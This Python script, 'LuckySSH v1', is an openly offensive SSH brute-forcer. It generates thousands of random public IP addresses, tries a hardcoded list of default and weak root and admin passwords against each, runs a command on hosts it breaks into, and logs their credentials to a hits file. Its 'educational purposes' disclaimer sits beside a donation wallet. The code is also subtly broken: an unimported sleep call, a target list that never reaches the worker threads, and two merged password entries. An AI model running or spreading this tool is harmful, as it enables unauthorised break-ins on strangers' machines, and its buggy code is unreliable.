#!/usr/local/bin/python3
#encoding: utf-8
#name: LuckySSH v1
#author: DrPython3 @ GitHub.com

# <<---------------------------------------------------------------------------------------------------------------->>

'''
    On a boring Sunday, I decided to write ...

    ####  [ LuckySSH v1 ]  ####

    This simple SSH bruteforcer spits out a number on startup, generates that amount of
    random IP addresses and tries to find active SSH-services with weak root logins, then.

'''

import random, paramiko, threading, os, sys, time, socket
from random import randint
import colorama
from colorama import *
init()
print(Fore.WHITE + '')

# <<---------------------------------------------------------------------------------------------------------------->>

'''
+-------------------------+
| Various stuff following |
+-------------------------+
'''

# logo:
logo = '''
___________________________________________________________________________________

                                .-. .-')                 .-')     .-')    ('-. .-. 
                                \  ( OO )               ( OO ).  ( OO ). ( OO )  / 
 ,--.     ,--. ,--.     .-----. ,--. ,--.   ,--.   ,--.(_)---\_)(_)---\_),--. ,--. 
 |  |.-') |  | |  |    '  .--./ |  .'   /    \  `.'  / /    _ | /    _ | |  | |  | 
 |  | OO )|  | | .-')  |  |('-. |      /,  .-')     /  \  :` `. \  :` `. |   .|  | 
 |  |`-' ||  |_|( OO )/_) |OO  )|     ' _)(OO  \   /    '..`''.) '..`''.)|       | 
(|  '---.'|  | | `-' /||  |`-'| |  .   \   |   /  /\_  .-._)   \.-._)   \|  .-.  | 
 |      |('  '-'(_.-'(_'  '--'\ |  |\   \  `-./  /.__) \       /\       /|  | |  | 
 `------'  `-----'      `-----' `--' '--'    `--'       `-----'  `-----' `--' `--' 

[[ LuckySSH v1 by DrPython3 @ GitHub.com -+#+- (!) FOR EDUCATIONAL PURPOSES ONLY ]]

Get your lucky number and try your luck on bruteforcing that amount of random IPs
         with this little tool ... HITS are saved to the file "hits.txt".
___________________________________________________________________________________

               LIKE THIS TOOL? BUY ME A COFFEE OR DONATE, PLEASE!
               
                WALLET (BTC): 19YMv87wkr8K7AJywxqHBrjCs4e8N2ngHT
___________________________________________________________________________________'''

# variables:
lucky_number = int(0)
checks_hit = int(0)
checks_bad = int(0)
default_timeout = float(5.0)
attack_threads = int(5)
targetips = []
weakwords = [
    'root:root','root:toor','root:raspberry','root:test','root:uploader','root:password','root:admin',
    'root:administrator','root:marketing','root:12345678','root:1234','root:12345','root:qwerty','root:webadmin',
    'root:webmaster','root:maintaince','root:techsupport','root:letmein','root:logon','root:Passw@rd','root:calvin',
    'administrator:password','administrator:Amx1234!','admin:1988','admin:admin','Administrator:Vision2','root:qwasyx21',
    'admin:insecure','root:default','root:leostream','localadmin:localadmin','root:rootpasswd','admin:password',
    'root:timeserver','admin:motorola','root:p@ck3tf3nc3','admin:avocent','root:linux','root:5up''root:uClinux',
    'root:alpine','root:dottie','root:arcsight','root:unitrends1','root:vagrant','root:fai','root:ceadmin',
    'root:palosanto','root:ubuntu1404','root:cubox-i','root:debian','root:xoa','root:sipwise','root:sixaola',
    'root:screencast','root:stxadmin','root:nosoup4u','root:indigo','root:video','root:ubnt'
]

# <<---------------------------------------------------------------------------------------------------------------->>

'''
+--------------------------------------------+
| Functions needed for performing the attack |
+--------------------------------------------+
'''

# clean screen on purpose:
def clean():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except: pass

# luckynumber() determins the amount of IP addresses to check:
def luckynumber():
    X = int(randint(666, 66666))
    return X

# ipwriter() saves the random IPs to a file:
def ipwriter(boring):
    with open('targets.txt', 'a') as targets:
        targets.write(str(boring) + '\n')
        targets.close()

# write hits to a file:
def hits(sunday):
    with open('hits.txt', 'a') as hitsfile:
        hitsfile.write(str(sunday) + '\n')
        hitsfile.close()

# ipgen() generates random ip addresses to attack:
def ipgen(bodycount):
    print(Fore.WHITE + 'Generating that amount of random IP addresses for you. Please wait (...)\n')
    try:
        X = int(bodycount)
        while X > 0:
            # generate 4 random numbers:
            r1 = int(randint(1, 255))
            r2 = int(randint(0, 255))
            r3 = int(randint(0, 255))
            r4 = int(randint(1, 255))
            randomip = (
                    # combine the 4 random numbers to an IP:
                    str(r1) + '.' + str(r2) + '.' + str(r3) + '.' + str(r4)
            )
            # write random IP to file:
            ipwriter(str(randomip))
            X -= 1
        print(Fore.LIGHTGREEN_EX + 'Random IP addresses are ready for an attack now (...)\n')
        return True
    except:
        return False

# countdown() ...yes, it counts down starting with "5":
def countdown():
    i = int(5)
    while i > 0:
        print(Fore.LIGHTYELLOW_EX + '... ' + str(i))
        sleep(0.9)
        i -= 1
    return None

# invader() is the SSH-client the bruter() will use:
def invader(ip, user, passwd, simon_says):
    try:
        # configure SSH-client:
        simon = paramiko.SSHClient()
        simon.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        # try to establish a connection:
        simon.connect(str(ip), int(22), str(user), str(passwd), timeout=float(default_timeout))
        invasion_session = simon.get_transport().open_session()
        # on active connection, send command "uname -r -v":
        if invasion_session.active:
            invasion_session.exec_command(str(simon_says))
            minion_answer = str(invasion_session.recv())
            print(Fore.LIGHTYELLOW_EX + 'TARGET: ' + str(ip) + ' tells ' + str(minion_answer) + ' ...\n')
        simon.close()
        # in case of successful attack, tell bruter "True":
        return True
    except:
        return False

# bruter() attacks the targets:
def bruter():
    global checks_hit, checks_bad
    # start loop:
    while len(targetips) > 0:
        try:
            # get (next) target:
            victim = str(targetips.pop(0))
            print(Fore.WHITE + 'Attacking -->> TARGET: ' + str(victim) + ' ...\n')
            # start loop to work on userpass-combolist:
            for combo in weakwords:
                # get (next) credentials:
                userpasswd = combo.split(':')
                user = str(userpasswd[0])
                passwd = str(userpasswd[1])
                # try connection and auth:
                check_result = invader(str(victim), str(user), str(passwd), str('uname -r -v'))
                # handle the result:
                if check_result == True:
                    hits(str(str('HOST: ') + str(victim) + ':22, USER: ' + str(user) + ', PASS: ' + str(passwd)))
                    print(Fore.LIGHTGREEN_EX + '(!) SUCCESS (!) -->> hit on TARGET: ' + str(victim) + '\n')
                    checks_hit += 1
                    break
                else:
                    print(Fore.LIGHTRED_EX + '(!) FAIL FOR (!) -->> ' + str(victim) + ':' + str(user) + ':'
                          + str(passwd) + ' ...\n')
                    continue
        except:
            print(Fore.LIGHTRED_EX + 'Attack on target: ' + str(victim) + ' failed ...\n')
            checks_bad += 1
            continue
    return None

# main() ... the attacker:
def main():
    try:
        # clean screen and print logo, then:
        clean()
        print(Fore.LIGHTRED_EX + Style.BRIGHT + logo)
        # get lucky number for user, tell about and generate random IPs:
        lucky_number = int(luckynumber())
        print(Fore.WHITE + '\nYour lucky number is: ' + Fore.LIGHTGREEN_EX + str(lucky_number) + ' ...\n')
        generator_status = ipgen(int(lucky_number))
        if generator_status == False:
            clean()
            sys.exit(Fore.LIGHTRED_EX + '\n\n(!) AN ERROR OCCURRED (!) when generating IPs ... sorry, bye!\n\n')
        else:
            # start the attack:
            print(Fore.LIGHTGREEN_EX + 'Starting attack in ...\n')
            countdown()
            clean()
            # fetch random IPs into targetlist:
            targetips = open('targets.txt', 'r').read().splitlines()
            # start bruter() multi-threaded:
            for _ in range(attack_threads):
                threading.Thread(target=bruter).start()
            # show stats in window title while bruteforce attack is ongoing:
            while len(targetips) > 0:
                try:
                    sleep(0.1)
                    wintitle = str(
                        'TO CHECK: ' + str(len(targetips)) + ' | HITS: ' + str(checks_hit) + ' | BAD: '
                        + str(checks_bad)
                    )
                    sys.stdout.write('\33]0;' + str(wintitle) + '\a')
                    sys.stdout.flush()
                except: pass
    except:
        # on errors, clean screen and close LuckySSH:
        clean()
        sys.exit(Fore.LIGHTRED_EX + '\n\n(!) AN ERROR OCCURRED (!) ... LuckySSH has been terminated!\n\n')

# <<---------------------------------------------------------------------------------------------------------------->>

'''
+---------------------------+
|   << (!) STARTUP (!) >>   |
+---------------------------+
'''
try:
    main()
    clean()
    if checks_hit > 0:
        sys.exit(Fore.LIGHTGREEN_EX + '\n\nYou lucky guy! Your hits have been saved to "hits.txt" ... bye!\n\n')
    else:
        sys.exit(Fore.LIGHTRED_EX + '\n\nBad luck! No hits for you this time ... bye!\n\n')
except KeyboardInterrupt:
    clean()
    sys.exit(
        Fore.LIGHTRED_EX + '\n\n(!) SUDDEN DEATH (!) to your attack ...\n\n\n' + Fore.WHITE + 'Your results: '
        + Fore.LIGHTGREEN_EX + 'HITS = ' + str(checks_hit) + Fore.WHITE + ', ' + Fore.LIGHTRED_EX + 'BAD = '
        + str(checks_bad) + Fore.WHITE + ', ' + Fore.LIGHTYELLOW_EX + 'LEFT = ' + str(len(targetips))
    )
# DrPython3 (C) 2020